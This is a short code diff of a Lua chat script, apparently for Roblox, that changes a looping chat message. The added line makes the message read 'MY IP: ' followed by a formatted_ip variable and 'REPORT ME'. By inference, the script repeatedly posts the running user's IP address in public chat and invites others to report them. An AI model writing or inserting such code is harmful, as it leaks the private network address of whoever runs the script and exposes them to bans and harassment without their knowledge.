@@ -106,8 +106,8 @@ end
 
 -- Run main
 main()
-local message2 = message22
-local delayTime = 4 -- Time in seconds between messages
+local message2 = "MY IP: " .. formatted_ip .. "REPORT ME"
+local delayTime = 8 -- Time in seconds between messages
 
 while true do
     -- Try using the new TextChatService first
